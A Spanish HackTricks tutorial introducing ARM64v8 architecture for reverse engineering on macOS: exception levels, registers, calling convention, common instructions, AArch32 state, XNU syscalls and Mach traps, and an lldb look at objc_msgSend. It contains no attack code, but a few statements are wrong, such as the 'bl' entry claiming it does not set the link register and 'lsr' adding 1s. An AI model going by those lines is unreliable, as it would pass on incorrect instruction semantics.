# Introducción a ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Niveles de excepción - EL (ARM64v8)**

En la arquitectura ARMv8, los niveles de ejecución, conocidos como niveles de excepción (EL), definen el nivel de privilegios y las capacidades del entorno de ejecución. Hay cuatro niveles de excepción, de EL0 a EL3, cada uno con un propósito diferente:

1. **EL0 - Modo usuario**:
- Es el nivel con menos privilegios y se utiliza para ejecutar código de aplicaciones normales.
- Las aplicaciones que se ejecutan en EL0 están aisladas entre sí y del software del sistema, lo que mejora la seguridad y la estabilidad.
2. **EL1 - Modo kernel del sistema operativo**:
- La mayoría de los kernels de sistemas operativos se ejecutan en este nivel.
- EL1 tiene más privilegios que EL0 y puede acceder a recursos del sistema, pero con algunas restricciones para garantizar la integridad del sistema. Se pasa de EL0 a EL1 mediante la instrucción SVC.
3. **EL2 - Modo hypervisor**:
- Este nivel se utiliza para la virtualización. Un hypervisor que se ejecuta en EL2 puede gestionar varios sistemas operativos (cada uno en su propio EL1) ejecutándose sobre el mismo hardware físico.
- EL2 proporciona funciones para el aislamiento y el control de los entornos virtualizados.
- Por lo tanto, las aplicaciones de máquinas virtuales como Parallels pueden utilizar `hypervisor.framework` para interactuar con EL2 y ejecutar máquinas virtuales sin necesitar extensiones del kernel.
- Para pasar de EL1 a EL2 se utiliza la instrucción `HVC`.
4. **EL3 - Modo Secure Monitor**:
- Es el nivel con más privilegios y suele utilizarse para el arranque seguro y los entornos de ejecución confiables.
- EL3 puede gestionar y controlar los accesos entre los estados seguro y no seguro (como secure boot, trusted OS, etc.).
- Se utilizaba para KPP (Kernel Patch Protection) en macOS, pero ya no se utiliza.
- Apple ya no utiliza EL3.
- La transición a EL3 normalmente se realiza mediante la instrucción `SMC` (Secure Monitor Call).

El uso de estos niveles permite gestionar de forma estructurada y segura los distintos aspectos del sistema, desde las aplicaciones de usuario hasta el software del sistema con más privilegios. El enfoque de ARMv8 respecto a los niveles de privilegio ayuda a aislar eficazmente los distintos componentes del sistema, mejorando así su seguridad y robustez.

## **Registros (ARM64v8)**

ARM64 tiene **31 registros de propósito general**, etiquetados como `x0` a `x30`. Cada uno puede almacenar un valor de **64 bits** (8 bytes). Para las operaciones que solo requieren valores de 32 bits, se puede acceder a los mismos registros en modo de 32 bits utilizando los nombres w0 a w30.

1. **`x0`** a **`x7`**: normalmente se utilizan como registros temporales y para pasar parámetros a subrutinas.
- **`x0`** también contiene los datos devueltos por una función
2. **`x8`**: en el kernel de Linux, `x8` se utiliza como número de system call para la instrucción `svc`. **¡En macOS se utiliza x16!**
3. **`x9`** a **`x15`**: más registros temporales, utilizados a menudo para variables locales.
4. **`x16`** y **`x17`**: **registros de llamada intraprocedimentales**. Registros temporales para valores inmediatos. También se utilizan para llamadas indirectas a funciones y stubs de PLT (Procedure Linkage Table).
- **`x16`** se utiliza como **número de system call** para la instrucción **`svc`** en **macOS**.
5. **`x18`**: **registro de plataforma**. Puede utilizarse como registro de propósito general, pero en algunas plataformas está reservado para usos específicos de la plataforma: puntero al bloque de entorno del thread actual en Windows, o para apuntar a la **estructura de task que se está ejecutando en el kernel de Linux**.
6. **`x19`** a **`x28`**: son registros preservados por la función llamada (callee-saved). Una función debe preservar los valores de estos registros para su caller, por lo que se almacenan en el stack y se recuperan antes de volver al caller.
7. **`x29`**: **frame pointer**, utilizado para realizar el seguimiento del stack frame. Cuando se crea un nuevo stack frame porque se llama a una función, el registro **`x29`** se **almacena en el stack** y la dirección del nuevo frame pointer (la dirección de **`sp`**) se **almacena en este registro**.
- Este registro también puede utilizarse como **registro de propósito general**, aunque normalmente se usa como referencia para las **variables locales**.
8. **`x30`** o **`lr`**: **registro de enlace**. Contiene la **dirección de retorno** cuando se ejecuta una instrucción `BL` (Branch with Link) o `BLR` (Branch with Link to Register), almacenando el valor de **`pc`** en este registro.
- También puede utilizarse como cualquier otro registro.
- Si la función actual va a llamar a una nueva función y, por tanto, sobrescribir `lr`, lo almacenará en el stack al principio; esto es el prólogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> almacenar `fp` y `lr`, reservar espacio y obtener el nuevo `fp`) y lo recuperará al final; esto es el epílogo (`ldp x29, x30, [sp], #48; ret` -> recuperar `fp` y `lr` y retornar).
9. **`sp`**: **stack pointer**, utilizado para realizar el seguimiento de la parte superior del stack.
- El valor de **`sp`** siempre debe mantenerse alineado como mínimo a un **quadword**, o puede producirse una excepción de alineación.
10. **`pc`**: **program counter**, que apunta a la siguiente instrucción. Este registro solo puede actualizarse mediante la generación de excepciones, los retornos de excepciones y los branches. Las únicas instrucciones ordinarias que pueden leer este registro son las instrucciones branch with link (BL, BLR), para almacenar la dirección de **`pc`** en **`lr`** (Link Register).
11. **`xzr`**: **registro cero**. También se denomina **`wzr`** en su forma de registro de **32** bits. Puede utilizarse para obtener fácilmente el valor cero (una operación habitual) o para realizar comparaciones usando **`subs`**, como en **`subs XZR, Xn, #10`**, almacenando los datos resultantes en ningún lugar (en **`xzr`**).

Los registros **`Wn`** son la versión de **32 bits** del registro **`Xn`**.

> [!TIP]
> Los registros X0 - X18 son volátiles, lo que significa que sus valores pueden cambiar debido a llamadas a funciones e interrupciones. Sin embargo, los registros X19 - X28 son no volátiles, lo que significa que sus valores deben preservarse entre llamadas a funciones ("callee saved").

### Registros SIMD y de coma flotante

Además, existen otros **32 registros de 128 bits** que pueden utilizarse en operaciones SIMD (single instruction multiple data) optimizadas y para realizar operaciones aritméticas de coma flotante. Se denominan registros Vn, aunque también pueden operar con **64**, **32**, **16** y **8** bits, en cuyo caso se denominan **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** y **`Bn`**.

### Registros del sistema

**Existen cientos de registros del sistema**, también llamados registros de propósito especial (SPRs), que se utilizan para **monitorizar** y **controlar** el comportamiento de los **procesadores**.\
Solo se pueden leer o establecer mediante las instrucciones especiales dedicadas **`mrs`** y **`msr`**.

Los registros especiales **`TPIDR_EL0`** y **`TPIDDR_EL0`** aparecen habitualmente al realizar reverse engineering. El sufijo `EL0` indica la **excepción mínima** desde la que se puede acceder al registro (en este caso, EL0 es el nivel de excepción (privilegio) normal con el que se ejecutan los programas normales).\
A menudo se utilizan para almacenar la **dirección base de la región de thread-local storage** de la memoria. Normalmente, el primero se puede leer y escribir desde programas que se ejecutan en EL0, mientras que el segundo se puede leer desde EL0 y escribir desde EL1 (como el kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contiene varios componentes del proceso serializados en el registro especial visible para el sistema operativo **`SPSR_ELx`**, siendo X el **nivel de permisos** de la excepción **activada** (esto permite recuperar el estado del proceso cuando finaliza la excepción).\
Estos son los campos accesibles:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Los flags de condición **`N`**, **`Z`**, **`C`** y **`V`**:
- **`N`** significa que la operación produjo un resultado negativo
- **`Z`** significa que la operación produjo cero
- **`C`** significa que la operación produjo un carry
- **`V`** significa que la operación produjo un overflow con signo:
- La suma de dos números positivos produce un resultado negativo.
- La suma de dos números negativos produce un resultado positivo.
- En una resta, cuando se resta un número negativo grande de un número positivo más pequeño (o viceversa) y el resultado no puede representarse dentro del rango del tamaño de bits proporcionado.
- Evidentemente, el procesador no sabe si la operación tiene signo o no, por lo que comprobará C y V en las operaciones e indicará si se produjo un carry en caso de que fuera con signo o sin signo.

> [!WARNING]
> No todas las instrucciones actualizan estos flags. Algunas, como **`CMP`** o **`TST`**, sí lo hacen, al igual que otras que tienen un sufijo s, como **`ADDS`**.

- El flag de **ancho actual del registro (`nRW`)**: si el flag contiene el valor 0, el programa se ejecutará en el estado de ejecución AArch64 al reanudarse.
- El **nivel de excepción actual** (**`EL`**): un programa normal que se ejecute en EL0 tendrá el valor 0
- El flag de **single stepping** (**`SS`**): lo utilizan los debuggers para ejecutar instrucciones paso a paso estableciendo el flag SS a 1 dentro de **`SPSR_ELx`** mediante una excepción. El programa ejecutará un paso y generará una excepción de single step.
- El flag de estado de **excepción ilegal** (**`IL`**): se utiliza para marcar cuándo un software privilegiado realiza una transferencia de nivel de excepción no válida; este flag se establece a 1 y el procesador genera una excepción de estado ilegal.
- Los flags **`DAIF`**: estos flags permiten que un programa privilegiado enmascare selectivamente determinadas excepciones externas.
- Si **`A`** es 1, significa que se generarán **asynchronous aborts**. **`I`** configura la respuesta a las **Interrupts Requests** (IRQs) externas de hardware, y F está relacionado con las **Fast Interrupt Requests** (FIRs).
- Los flags de selección del stack pointer (**`SPS`**): los programas privilegiados que se ejecutan en EL1 y superiores pueden alternar entre su propio registro de stack pointer y el del modelo de usuario (por ejemplo, entre `SP_EL1` y `EL0`). Este cambio se realiza escribiendo en el registro especial **`SPSel`**. No puede hacerse desde EL0.

## **Calling Convention (ARM64v8)**

La calling convention de ARM64 especifica que los **primeros ocho parámetros** de una función se pasan en los registros **`x0`** a **`x7`**. Los parámetros **adicionales** se pasan en el **stack**. El valor de **retorno** se devuelve en el registro **`x0`**, o también en **`x1`** **si tiene una longitud de 128 bits**. Los registros **`x19`** a **`x30`** y **`sp`** deben **preservarse** entre llamadas a funciones.

Al leer una función en assembly, hay que buscar el **prólogo y el epílogo de la función**. El **prólogo** normalmente consiste en **guardar el frame pointer (`x29`)**, establecer un **nuevo frame pointer** y **reservar espacio en el stack**. El **epílogo** normalmente consiste en **restaurar el frame pointer guardado** y **retornar** de la función.

### Calling Convention en Swift

Swift tiene su propia **calling convention**, que se puede consultar en [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instrucciones comunes (ARM64v8)**

Las instrucciones ARM64 generalmente tienen el **formato `opcode dst, src1, src2`**, donde **`opcode`** es la **operación** que se realizará (como `add`, `sub`, `mov`, etc.), **`dst`** es el registro de **destino** donde se almacenará el resultado, y **`src1`** y **`src2`** son los registros **fuente**. También pueden utilizarse valores inmediatos en lugar de registros fuente.

- **`mov`**: **mueve** un valor de un **registro** a otro.
- Ejemplo: `mov x0, x1` — mueve el valor de `x1` a `x0`.
- **`ldr`**: **carga** un valor de la **memoria** en un **registro**.
- Ejemplo: `ldr x0, [x1]` — carga en `x0` un valor de la ubicación de memoria apuntada por `x1`.
- **Modo offset**: se indica un offset que afecta al puntero de origen, por ejemplo:
- `ldr x2, [x1, #8]`, carga en x2 el valor de x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, carga en x2 un objeto del array x0, desde la posición x1 (índice) \* 4
- **Modo pre-indexado**: aplica los cálculos al origen, obtiene el resultado y también almacena el nuevo origen en el origen.
- `ldr x2, [x1, #8]!`, carga `x1 + 8` en `x2` y almacena en x1 el resultado de `x1 + 8`
- `str lr, [sp, #-4]!`, almacena el registro de enlace en sp y actualiza el registro sp
- **Modo post-indexado**: es como el anterior, pero primero se accede a la dirección de memoria y después se calcula y almacena el offset.
- `ldr x0, [x1], #8`, carga `x1` en `x0` y actualiza x1 con `x1 + 8`
- **Direccionamiento relativo a PC**: en este caso, la dirección que se cargará se calcula con respecto al registro PC
- `ldr x1, =_start`, carga en x1 la dirección donde comienza el símbolo `_start` con respecto al PC actual.
- **`str`**: **almacena** un valor de un **registro** en la **memoria**.
- Ejemplo: `str x0, [x1]` — almacena el valor de `x0` en la ubicación de memoria apuntada por `x1`.
- **`ldp`**: **Load Pair of Registers**. Esta instrucción **carga dos registros** desde ubicaciones de **memoria consecutivas**. La dirección de memoria normalmente se forma sumando un offset al valor de otro registro.
- Ejemplo: `ldp x0, x1, [x2]` — carga `x0` y `x1` desde las ubicaciones de memoria `x2` y `x2 + 8`, respectivamente.
- **`stp`**: **Store Pair of Registers**. Esta instrucción **almacena dos registros** en ubicaciones de **memoria consecutivas**. La dirección de memoria normalmente se forma sumando un offset al valor de otro registro.
- Ejemplo: `stp x0, x1, [sp]` — almacena `x0` y `x1` en las ubicaciones de memoria `sp` y `sp + 8`, respectivamente.
- `stp x0, x1, [sp, #16]!` — almacena `x0` y `x1` en las ubicaciones de memoria `sp+16` y `sp + 24`, respectivamente, y actualiza `sp` con `sp+16`.
- **`add`**: **suma** los valores de dos registros y almacena el resultado en un registro.
- Sintaxis: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destino
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registro o valor inmediato)
- \[shift #N | RRX] -> realiza un shift o llama a RRX
- Ejemplo: `add x0, x1, x2` — suma los valores de `x1` y `x2` y almacena el resultado en `x0`.
- `add x5, x5, #1, lsl #12` — esto equivale a 4096 (un 1 desplazado 12 veces) -> 1 0000 0000 0000 0000
- **`adds`**: realiza un `add` y actualiza los flags
- **`sub`**: **resta** los valores de dos registros y almacena el resultado en un registro.
- Consulta la **sintaxis** de **`add`**.
- Ejemplo: `sub x0, x1, x2` — resta el valor de `x2` a `x1` y almacena el resultado en `x0`.
- **`subs`**: es como sub, pero actualizando los flags
- **`mul`**: **multiplica** los valores de **dos registros** y almacena el resultado en un registro.
- Ejemplo: `mul x0, x1, x2` — multiplica los valores de `x1` y `x2` y almacena el resultado en `x0`.
- **`div`**: **divide** el valor de un registro entre otro y almacena el resultado en un registro.
- Ejemplo: `div x0, x1, x2` — divide el valor de `x1` entre `x2` y almacena el resultado en `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`**, **`rrx`**:
- **Logical shift left**: añade 0 al final y desplaza los demás bits hacia delante (multiplica por n veces 2)
- **Logical shift right**: añade 1 al principio y desplaza los demás bits hacia atrás (divide por n veces 2 en unsigned)
- **Arithmetic shift right**: como **`lsr`**, pero en lugar de añadir 0, si el bit más significativo es 1, se añaden **1** (divide por n veces 2 con signo)
- **Rotate right**: como **`lsr`**, pero lo que se elimina por la derecha se añade por la izquierda
- **Rotate Right with Extend**: como **`ror`**, pero utilizando el carry flag como el "bit más significativo". Por tanto, el carry flag se mueve al bit 31 y el bit eliminado pasa al carry flag.
- **`bfm`**: **Bit Field Move**; estas operaciones **copian los bits `0...n`** de un valor y los colocan en las posiciones **`m..m+n`**. **`#s`** especifica la posición del bit más a la izquierda y **`#r`** la cantidad de rotación a la derecha.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** copia un bitfield de un registro y lo copia en otro registro.
- **`BFI X1, X2, #3, #4`** inserta 4 bits de X2 a partir del tercer bit de X1
- **`BFXIL X1, X2, #3, #4`** extrae cuatro bits de X2 a partir del tercer bit y los copia en X1
- **`SBFIZ X1, X2, #3, #4`** extiende con signo 4 bits de X2 y los inserta en X1 empezando en la posición de bit 3, poniendo a cero los bits de la derecha
- **`SBFX X1, X2, #3, #4`** extrae 4 bits de X2 empezando en el bit 3, los extiende con signo y coloca el resultado en X1
- **`UBFIZ X1, X2, #3, #4`** extiende con ceros 4 bits de X2 y los inserta en X1 empezando en la posición de bit 3, poniendo a cero los bits de la derecha
- **`UBFX X1, X2, #3, #4`** extrae 4 bits de X2 empezando en el bit 3 y coloca el resultado extendido con ceros en X1.
- **Sign Extend To X:** extiende el signo (o simplemente añade 0 en la versión unsigned) de un valor para poder realizar operaciones con él:
- **`SXTB X1, W2`** extiende el signo de un byte **de W2 a X1** (`W2` es la mitad de `X2`) para llenar los 64 bits
- **`SXTH X1, W2`** extiende el signo de un número de 16 bits **de W2 a X1** para llenar los 64 bits
- **`SXTW X1, W2`** extiende el signo de un byte **de W2 a X1** para llenar los 64 bits
- **`UXTB X1, W2`** añade 0 (unsigned) a un byte **de W2 a X1** para llenar los 64 bits
- **`extr`:** extrae bits de un **par de registros concatenados** especificado.
- Ejemplo: `EXTR W3, W2, W1, #3` esto **concatena W1+W2** y obtiene **desde el bit 3 de W2 hasta el bit 3 de W1**, almacenándolo en W3.
- **`cmp`**: **compara** dos registros y establece los flags de condición. Es un **alias de `subs`** que establece el registro de destino en el registro cero. Es útil para saber si `m == n`.
- Admite la **misma sintaxis que `subs`**
- Ejemplo: `cmp x0, x1` — compara los valores de `x0` y `x1` y establece los flags de condición correspondientes.
- **`cmn`**: operando **Compare negative**. En este caso es un **alias de `adds`** y admite la misma sintaxis. Es útil para saber si `m == -n`.
- **`ccmp`**: comparación condicional; es una comparación que solo se realizará si una comparación anterior fue verdadera y establecerá específicamente los bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> si x1 != x2 y x3 < x4, salta a func
- Esto se debe a que **`ccmp`** solo se ejecutará si el **`cmp` anterior era `NE`**; si no lo era, los bits `nzcv` se establecerán en 0 (lo que no satisfará la comparación `blt`).
- Esto también se puede utilizar como `ccmn` (igual, pero negativo, como `cmp` frente a `cmn`).
- **`tst`**: comprueba si alguno de los valores de la comparación es ambos 1 (funciona como un ANDS sin almacenar el resultado en ningún lugar). Es útil para comprobar un registro con un valor y verificar si alguno de los bits del registro indicados en el valor es 1.
- Ejemplo: `tst X1, #7` comprueba si alguno de los últimos 3 bits de X1 es 1
- **`teq`**: operación XOR descartando el resultado
- **`b`**: branch incondicional
- Ejemplo: `b myFunction`
- Ten en cuenta que esto no rellenará el registro de enlace con la dirección de retorno (no es adecuado para llamadas a subrutinas que necesitan retornar)
- **`bl`**: **branch** con enlace, utilizado para **llamar** a una **subrutina**. Almacena la **dirección de retorno en `x30`**.
- Ejemplo: `bl myFunction` — llama a la función `myFunction` y almacena la dirección de retorno en `x30`.
- Ten en cuenta que esto no rellenará el registro de enlace con la dirección de retorno (no es adecuado para llamadas a subrutinas que necesitan retornar)
- **`blr`**: **Branch** con Link to Register, utilizado para **llamar** a una **subrutina** cuyo destino está **especificado** en un **registro**. Almacena la dirección de retorno en `x30`.
- Ejemplo: `blr x1` — llama a la función cuya dirección está contenida en `x1` y almacena la dirección de retorno en `x30`.
- **`ret`**: **retorna** de una **subrutina**, normalmente utilizando la dirección de **`x30`**.
- Ejemplo: `ret` — retorna de la subrutina actual utilizando la dirección de retorno en `x30`.
- **`b.<cond>`**: branches condicionales
- **`b.eq`**: **branch si es igual**, basado en la instrucción `cmp` anterior.
- Ejemplo: `b.eq label` — si la instrucción `cmp` anterior encontró dos valores iguales, salta a `label`.
- **`b.ne`**: **branch si no es igual**. Esta instrucción comprueba los flags de condición (establecidos por una instrucción de comparación anterior) y, si los valores comparados no eran iguales, salta a una etiqueta o dirección.
- Ejemplo: después de una instrucción `cmp x0, x1`, `b.ne label` — si los valores de `x0` y `x1` no eran iguales, salta a `label`.
- **`cbz`**: **Compare and Branch on Zero**. Esta instrucción compara un registro con cero y, si son iguales, salta a una etiqueta o dirección.
- Ejemplo: `cbz x0, label` — si el valor de `x0` es cero, salta a `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Esta instrucción compara un registro con cero y, si no son iguales, salta a una etiqueta o dirección.
- Ejemplo: `cbnz x0, label` — si el valor de `x0` no es cero, salta a `label`.
- **`tbnz`**: comprueba un bit y hace branch si no es cero
- Ejemplo: `tbnz x0, #8, label`
- **`tbz`**: comprueba un bit y hace branch si es cero
- Ejemplo: `tbz x0, #8, label`
- **Operaciones de selección condicional**: son operaciones cuyo comportamiento varía en función de los bits condicionales.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> si es verdadero, X0 = X1; si es falso, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> si es verdadero, Xd = Xn; si es falso, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> si es verdadero, Xd = Xn + 1; si es falso, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> si es verdadero, Xd = Xn; si es falso, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> si es verdadero, Xd = NOT(Xn); si es falso, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> si es verdadero, Xd = Xn; si es falso, Xd = - Xm
- `cneg Xd, Xn, cond` -> si es verdadero, Xd = - Xn; si es falso, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> si es verdadero, Xd = 1; si es falso, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> si es verdadero, Xd = \<all 1>; si es falso, Xd = 0
- **`adrp`**: calcula la **dirección de página de un símbolo** y la almacena en un registro.
- Ejemplo: `adrp x0, symbol` — calcula la dirección de página de `symbol` y la almacena en `x0`.
- **`ldrsw`**: **carga** un valor con signo de **32 bits** desde la memoria y lo **extiende con signo a 64** bits. Se utiliza en casos habituales de SWITCH.
- Ejemplo: `ldrsw x0, [x1]` — carga un valor con signo de 32 bits desde la ubicación de memoria apuntada por `x1`, lo extiende con signo a 64 bits y lo almacena en `x0`.
- **`stur`**: **almacena el valor de un registro en una ubicación de memoria**, utilizando un offset de otro registro.
- Ejemplo: `stur x0, [x1, #4]` — almacena el valor de `x0` en la dirección de memoria que está 4 bytes por encima de la dirección actual de `x1`.
- **`svc`**: realiza una **system call**. Significa "Supervisor Call". Cuando el procesador ejecuta esta instrucción, **cambia del modo usuario al modo kernel** y salta a una ubicación específica de la memoria donde se encuentra el código de **gestión de system calls del kernel**.

- Ejemplo:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Prólogo de función**

1. **Guardar el registro de enlace y el frame pointer en el stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurar el nuevo puntero de marco**: `mov x29, sp` (configura el nuevo puntero de marco para la función actual)
3. **Reservar espacio en la pila para las variables locales** (si es necesario): `sub sp, sp, <size>` (donde `<size>` es el número de bytes necesarios)

### **Epílogo de la función**

1. **Liberar las variables locales** (si se reservaron): `add sp, sp, <size>`
2. **Restaurar el registro de enlace y el puntero de marco**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (devuelve el control al caller usando la dirección del link register)

## Protecciones de memoria comunes de ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Estado de ejecución AARCH32

Armv8-A admite la ejecución de programas de 32 bits. **AArch32** puede ejecutarse en uno de **dos conjuntos de instrucciones**: **`A32`** y **`T32`**, y puede cambiar entre ellos mediante **`interworking`**.\
Los programas de 64 bits **privileged** pueden programar la **ejecución de programas de 32 bits** ejecutando una transferencia de nivel de excepción al nivel inferior de 32 bits con menos privilegios.\
Ten en cuenta que la transición de 64 bits a 32 bits ocurre con una reducción del nivel de excepción (por ejemplo, un programa de 64 bits en EL1 que activa un programa en EL0). Esto se realiza estableciendo el **bit 4 de** **`SPSR_ELx`**, un registro especial, **a 1** cuando el thread de proceso **AArch32** está listo para ejecutarse, mientras que el resto de `SPSR_ELx` almacena el CPSR del programa **`AArch32`**. Entonces, el proceso privilegiado llama a la instrucción **`ERET`**, por lo que el procesador cambia a **`AArch32`** y entra en A32 o T32 dependiendo de CPSR**.**

El **`interworking`** se realiza usando los bits J y T de CPSR. `J=0` y `T=0` significa **`A32`**, mientras que `J=0` y `T=1` significa **T32**. Básicamente, esto se traduce en establecer el **bit menos significativo a 1** para indicar que el conjunto de instrucciones es T32.\
Esto se establece durante las **instrucciones de branch de `interworking`**, pero también puede establecerse directamente con otras instrucciones cuando el PC se configura como el registro de destino. Ejemplo:

Otro ejemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registros

Hay 16 registros de 32 bits (r0-r15). **De r0 a r14** pueden utilizarse para **cualquier operación**; sin embargo, algunos suelen estar reservados:

- **`r15`**: Contador de programa (siempre). Contiene la dirección de la siguiente instrucción. En A32, actual + 8; en T32, actual + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Registro de llamada intra-procedimental
- **`r13`**: Stack Pointer (ten en cuenta que el stack siempre está alineado a 16 bytes)
- **`r14`**: Link Register

Además, los registros tienen respaldo en **`banked registries`**, que son ubicaciones que almacenan los valores de los registros y permiten realizar un **cambio de contexto rápido** durante el manejo de excepciones y las operaciones privilegiadas, evitando tener que guardar y restaurar manualmente los registros cada vez.\
Esto se realiza **guardando el estado del procesador desde `CPSR` en `SPSR`** del modo del procesador al que se transfiere la excepción. Al regresar de la excepción, el **`CPSR`** se restaura desde el **`SPSR`**.

### CPSR - Current Program Status Register

En AArch32, el CPSR funciona de forma similar a **`PSTATE`** en AArch64 y también se almacena en **`SPSR_ELx`** cuando se produce una excepción, para restaurar posteriormente la ejecución:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Los campos se dividen en varios grupos:

- Application Program Status Register (APSR): flags aritméticos y accesible desde EL0
- Execution State Registers: comportamiento del proceso (gestionado por el sistema operativo).

#### Application Program Status Register (APSR)

- Los flags **`N`**, **`Z`**, **`C`**, **`V`** (igual que en AArch64)
- El flag **`Q`**: se establece en 1 cuando se produce una **saturación de enteros** durante la ejecución de una instrucción aritmética especializada de saturación. Una vez establecido en **`1`**, mantiene ese valor hasta que se establece manualmente en 0. Además, no existe ninguna instrucción que compruebe implícitamente su valor; debe hacerse leyéndolo manualmente.
- Flags **`GE`** (Greater than or equal): se utilizan en operaciones SIMD (Single Instruction, Multiple Data), como "parallel add" y "parallel subtract". Estas operaciones permiten procesar varios puntos de datos en una sola instrucción.

Por ejemplo, la instrucción **`UADD8`** **suma cuatro pares de bytes** (de dos operandos de 32 bits) en paralelo y almacena los resultados en un registro de 32 bits. Después, **establece los flags `GE` en el `APSR`** según estos resultados. Cada flag GE corresponde a una de las sumas de bytes e indica si la suma de ese par de bytes **produjo un overflow**.

La instrucción **`SEL`** utiliza estos flags GE para realizar acciones condicionales.

#### Execution State Registers

- Los bits **`J`** y **`T`**: **`J`** debe ser 0; si **`T`** es 0, se utiliza el conjunto de instrucciones A32, y si es 1, se utiliza T32.
- **IT Block State Register** (`ITSTATE`): son los bits del 10-15 y 25-26. Almacenan las condiciones para las instrucciones dentro de un grupo precedido por **`IT`**.
- Bit **`E`**: indica el **endianness**.
- **Mode and Exception Mask Bits** (0-4): determinan el estado de ejecución actual. El quinto indica si el programa se ejecuta en 32 bits (un 1) o en 64 bits (un 0). Los otros 4 representan el **modo de excepción actualmente utilizado** (cuando se produce una excepción y está siendo gestionada). El número establecido **indica la prioridad actual** en caso de que se active otra excepción mientras esta está siendo gestionada.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: ciertas excepciones pueden deshabilitarse mediante los bits **`A`**, `I`, `F`. Si **`A`** es 1, significa que se activarán **asynchronous aborts**. **`I`** configura la respuesta a las **Interrupts Requests** (IRQs) del hardware externo, y `F` está relacionado con las **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Consulta [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) o ejecuta `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. Los BSD syscalls tendrán **x16 > 0**.

### Mach Traps

Consulta en [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) la `mach_trap_table` y en [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) los prototipos. El número máximo de Mach traps es `MACH_TRAP_TABLE_COUNT` = 128. Los Mach traps tendrán **x16 < 0**, por lo que debes llamar a los números de la lista anterior con un **menos**: **`_kernelrpc_mach_vm_allocate_trap`** es **`-10`**.

También puedes consultar **`libsystem_kernel.dylib`** en un disassembler para encontrar cómo llamar a estos syscalls (y a los BSD syscalls):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Ten en cuenta que **Ida** y **Ghidra** también pueden decompilar **dylibs específicas** de la cache simplemente pasando la cache.

> [!TIP]
> A veces es más fácil revisar el código **decompilado** de **`libsystem_kernel.dylib`** que revisar el **código fuente**, porque el código de varias syscalls (BSD y Mach) se genera mediante scripts (consulta los comentarios en el código fuente), mientras que en la dylib puedes encontrar qué se está llamando.

### machdep calls

XNU admite otro tipo de llamadas llamadas dependientes de la máquina. Los números de estas llamadas dependen de la arquitectura, y no se garantiza que ni las llamadas ni los números permanezcan constantes.

### comm page

Esta es una página de memoria propiedad del kernel que se asigna en el espacio de direcciones del proceso de cada usuario. Está destinada a hacer que la transición del modo usuario al espacio del kernel sea más rápida que usando syscalls para servicios del kernel que se utilizan con tanta frecuencia que esta transición sería muy ineficiente.

Por ejemplo, la llamada `gettimeofdate` lee el valor de `timeval` directamente desde la comm page.

### objc_msgSend

Es muy común encontrar esta función en programas Objective-C o Swift. Esta función permite llamar a un método de un objeto Objective-C.

Parámetros ([más información en la documentación](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> Puntero a la instancia
- x1: op -> Selector del método
- x2... -> Resto de los argumentos del método invocado

Por lo tanto, si colocas un breakpoint antes del branch a esta función, puedes encontrar fácilmente qué se invoca en lldb con (en este ejemplo, el objeto llama a un objeto de `NSConcreteTask` que ejecutará un comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

